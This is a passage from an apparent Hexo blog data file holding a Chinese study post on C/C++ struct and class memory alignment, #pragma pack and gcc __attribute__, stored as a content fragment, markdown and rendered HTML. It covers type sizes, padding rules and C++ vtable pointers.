在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了...\n![attri_1](/images/gcc-st-3.png)\n#### 4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~\n![attri_2](/images/gcc-st-4.png)\n#### 5. 证明了有pack为1的地方必定不留一点空隙~~~\n![pack_1](/images/gcc-st-5.png)\n#### 6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\n![st_to_st](/images/gcc-st-6.png)\n#### 7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\n![st_to_aligned(1)](/images/gcc-st-7.png)\n### 5. C++中的高级之处\n> 至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的**封装**程度已经快到了`说话编程`的地步了．重复造轮子有必要吗？珍爱生命，快用py？  \n\n#### 1.C++中的结构体和类的区别？\n根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题[链接](http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang).因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为`高低电平`或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).\n\n#### 2. C++中class的虚函数\nC++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(`obj.func(a, b, c);`)在编译器翻译的汇编代码里面等价于(`func(&obj, a, b, c);`),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊....\n\n---\n先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~\n","source":"_posts/memory-align.md","raw":"---\ntitle: memory_align\ndate: 2016-08-21 21:24:53\ncategories:\n- study\ntags: \n- C/C++\n---\n\n\n## 关于C/C++中结构体(类)内存对齐问题  \n\n---\n\n> 各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛[stackoverflow](http://stackoverflow.com/ \"Stack Overflow\")等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．\n\n---\n可参考资料：  \n[维基百科](https://en.wikipedia.org/wiki/Data_structure_alignment#Problems \"维基百科\")\n[StackOverflow GCC Structure](http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs)\n[GCC文档](https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)\n### 1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:  \n#### 32位编译器：\n      char ：1个字节\n      char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   4个字节\n      long long:  8个字节\n      unsigned long:  4个字节\n#### 64位编译器：\n      char ：1个字节\n      char* (即指针变量): 8个字节\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   8个字节\n      long long:  8个字节\n      unsigned long:  8个字节  \n其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．\n\n---\n\n### 2. 变量排放规则(自己的见解)  \n#### 1. 内置类型对象(如char<1字节>、int<现代PC编译器普遍为4字节>等)的**对齐起始地址**为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.  \n#### 2. 整个结构体或者类的**大小**为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。  \n\n> 可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行**取指，译码，执行等**操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地\"串并联\"起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的\"1\"和\"0\"．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎`磕碜`的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)\n\n### 3. Win栗子如下：\n#### 1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\n![配置](/images/1.png)\n#### 2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\n![int b](/images/2.png)\n#### 3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\n![整数倍](/images/3.png)\n#### 4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\n![数组](/images/4.png)\n#### 5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\n![char](/images/5.png)\n#### 6. 说明#pragma pack (n) n非2的幂的值时候无效\n![#pragma pack (n)](/images/6.png)\n#### 7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\n![struct](/images/7.png)\n#### 8. 说明pragma pack (3)没作用\n![pack (3)](/images/8.png)\n\n### 4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\n#### 1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\n![gcc -v](/images/gcc-st-1.png)\n#### 2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\n![4 butys](/images/gcc-st-2.png)\n#### 3. 在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了...\n![attri_1](/images/gcc-st-3.png)\n#### 4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~\n![attri_2](/images/gcc-st-4.png)\n#### 5. 证明了有pack为1的地方必定不留一点空隙~~~\n![pack_1](/images/gcc-st-5.png)\n#### 6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\n![st_to_st](/images/gcc-st-6.png)\n#### 7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\n![st_to_aligned(1)](/images/gcc-st-7.png)\n### 5. C++中的高级之处\n> 至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的**封装**程度已经快到了`说话编程`的地步了．重复造轮子有必要吗？珍爱生命，快用py？  \n\n#### 1.C++中的结构体和类的区别？\n根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题[链接](http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang).因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为`高低电平`或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).\n\n#### 2. C++中class的虚函数\nC++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(`obj.func(a, b, c);`)在编译器翻译的汇编代码里面等价于(`func(&obj, a, b, c);`),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊....\n\n---\n先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~\n","slug":"memory-align","published":1,"updated":"2016-11-14T02:56:11.055Z","_id":"civhnccv20007g8ua9j06phpx","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"关于C-C-中结构体-类-内存对齐问题\"><a href=\"#关于C-C-中结构体-类-内存对齐问题\" class=\"headerlink\" title=\"关于C/C++中结构体(类)内存对齐问题\"></a>关于C/C++中结构体(类)内存对齐问题</h2><hr>\n<blockquote>\n<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href=\"http://stackoverflow.com/\" title=\"Stack Overflow\" target=\"_blank\" rel=\"external\">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>\n</blockquote>\n<hr>\n<p>可参考资料：<br><a href=\"https://en.wikipedia.org/wiki/Data_structure_alignment#Problems\" title=\"维基百科\" target=\"_blank\" rel=\"external\">维基百科</a><br><a href=\"http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs\" target=\"_blank\" rel=\"external\">StackOverflow GCC Structure</a><br><a href=\"https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html\" target=\"_blank\" rel=\"external\">GCC文档</a></p>\n<h3 id=\"1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\"><a href=\"#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\" class=\"headerlink\" title=\"1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:\"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id=\"32位编译器：\"><a href=\"#32位编译器：\" class=\"headerlink\" title=\"32位编译器：\"></a>32位编译器：</h4><pre><code>char ：1个字节\nchar*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   4个字节\nlong long:  8个字节\nunsigned long:  4个字节\n</code></pre><h4 id=\"64位编译器：\"><a href=\"#64位编译器：\" class=\"headerlink\" title=\"64位编译器：\"></a>64位编译器：</h4><pre><code>char ：1个字节\nchar* (即指针变量): 8个字节\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   8个字节\nlong long:  8个字节\nunsigned long:  8个字节  \n</code></pre><p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>\n<hr>\n<h3 id=\"2-变量排放规则-自己的见解\"><a href=\"#2-变量排放规则-自己的见解\" class=\"headerlink\" title=\"2. 变量排放规则(自己的见解)\"></a>2. 变量排放规则(自己的见解)</h3><h4 id=\"1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\"><a href=\"#1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\" class=\"headerlink\" title=\"1. 内置类型对象(如char、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.\"></a>1. 内置类型对象(如char<1字节>、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</1字节></h4><h4 id=\"2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"><a href=\"#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\" class=\"headerlink\" title=\"2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>\n<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>\n</blockquote>\n<h3 id=\"3-Win栗子如下：\"><a href=\"#3-Win栗子如下：\" class=\"headerlink\" title=\"3. Win栗子如下：\"></a>3. Win栗子如下：</h3><h4 id=\"1-这是以前我用Win的时候VC-6-0编译器的效果图\"><a href=\"#1-这是以前我用Win的时候VC-6-0编译器的效果图\" class=\"headerlink\" title=\"1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src=\"/images/1.png\" alt=\"配置\"></p>\n<h4 id=\"2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"><a href=\"#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\" class=\"headerlink\" title=\"2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src=\"/images/2.png\" alt=\"int b\"></p>\n<h4 id=\"3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\"><a href=\"#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\" class=\"headerlink\" title=\"3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src=\"/images/3.png\" alt=\"整数倍\"></p>\n<h4 id=\"4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"><a href=\"#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\" class=\"headerlink\" title=\"4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src=\"/images/4.png\" alt=\"数组\"></p>\n<h4 id=\"5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\"><a href=\"#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\" class=\"headerlink\" title=\"5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src=\"/images/5.png\" alt=\"char\"></p>\n<h4 id=\"6-说明-pragma-pack-n-n非2的幂的值时候无效\"><a href=\"#6-说明-pragma-pack-n-n非2的幂的值时候无效\" class=\"headerlink\" title=\"6. 说明#pragma pack (n) n非2的幂的值时候无效\"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src=\"/images/6.png\" alt=\"#pragma pack (n)\"></p>\n<h4 id=\"7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"><a href=\"#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\" class=\"headerlink\" title=\"7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src=\"/images/7.png\" alt=\"struct\"></p>\n<h4 id=\"8-说明pragma-pack-3-没作用\"><a href=\"#8-说明pragma-pack-3-没作用\" class=\"headerlink\" title=\"8. 说明pragma pack (3)没作用\"></a>8. 说明pragma pack (3)没作用</h4><p><img src=\"/images/8.png\" alt=\"pack (3)\"></p>\n<h3 id=\"4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\"><a href=\"#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\" class=\"headerlink\" title=\"4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\"></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id=\"1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\"><a href=\"#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\" class=\"headerlink\" title=\"1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src=\"/images/gcc-st-1.png\" alt=\"gcc -v\"></p>\n<h4 id=\"2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"><a href=\"#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\" class=\"headerlink\" title=\"2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src=\"/images/gcc-st-2.png\" alt=\"4 butys\"></p>\n<h4 id=\"3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"><a href=\"#3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\" class=\"headerlink\" title=\"3. 在gcc中加入功能和pragma pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"></a>3. 在gcc中加入功能和pragma pack差不多的<strong>attribute</strong>选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src=\"/images/gcc-st-3.png\" alt=\"attri_1\"></p>\n<h4 id=\"4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\"><a href=\"#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\" class=\"headerlink\" title=\"4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事~\"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，<strong>attribute</strong>干得好事~</h4><p><img src=\"/images/gcc-st-4.png\" alt=\"attri_2\"></p>\n<h4 id=\"5-证明了有pack为1的地方必定不留一点空隙\"><a href=\"#5-证明了有pack为1的地方必定不留一点空隙\" class=\"headerlink\" title=\"5. 证明了有pack为1的地方必定不留一点空隙~~~\"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src=\"/images/gcc-st-5.png\" alt=\"pack_1\"></p>\n<h4 id=\"6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"><a href=\"#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\" class=\"headerlink\" title=\"6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src=\"/images/gcc-st-6.png\" alt=\"st_to_st\"></p>\n<h4 id=\"7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"><a href=\"#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\" class=\"headerlink\" title=\"7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src=\"/images/gcc-st-7.png\" alt=\"st_to_aligned(1)\"></p>\n<h3 id=\"5-C-中的高级之处\"><a href=\"#5-C-中的高级之处\" class=\"headerlink\" title=\"5. C++中的高级之处\"></a>5. C++中的高级之处</h3><blockquote>\n<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>\n</blockquote>\n<h4 id=\"1-C-中的结构体和类的区别？\"><a href=\"#1-C-中的结构体和类的区别？\" class=\"headerlink\" title=\"1.C++中的结构体和类的区别？\"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href=\"http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang\" target=\"_blank\" rel=\"external\">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).</p>\n<h4 id=\"2-C-中class的虚函数\"><a href=\"#2-C-中class的虚函数\" class=\"headerlink\" title=\"2. C++中class的虚函数\"></a>2. 